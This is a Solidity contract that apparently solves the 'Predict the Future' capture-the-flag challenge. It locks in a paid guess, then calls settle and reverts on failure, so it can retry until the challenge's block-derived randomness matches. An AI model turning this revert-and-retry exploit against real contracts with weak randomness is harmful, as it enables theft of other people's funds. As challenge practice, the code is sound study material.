pragma solidity ^0.4.21;

interface IPredictTheFutureChallenge {
    function lockInGuess(uint8 n) external payable;
    function settle() external;
    function isComplete() external view returns(bool);
}

contract PredictTheFutureSolver {
    
    IPredictTheFutureChallenge public challenge;
    address public owner;

    event challengeSolved(uint256 balance);

    function PredictTheFutureSolver(address challengeAddress) public {
        challenge = IPredictTheFutureChallenge(challengeAddress);
        owner = msg.sender;
    }

    function withdraw() public payable {
        require(msg.sender == owner, "Only owner can withdraw funds");
        msg.sender.transfer(address(this).balance);
    }

    function lockNumber(uint8 n) public payable {
        require(n >= 0 && n <= 9, "Number must be in the 0-9 range");
        challenge.lockInGuess.value(1 ether)(n);
    }
    
    function settleChallenge() public payable {
        challenge.settle();
        require(challenge.isComplete(), "Wrong answer");
        emit challengeSolved(address(this).balance);
    }

    function() external payable {}

}
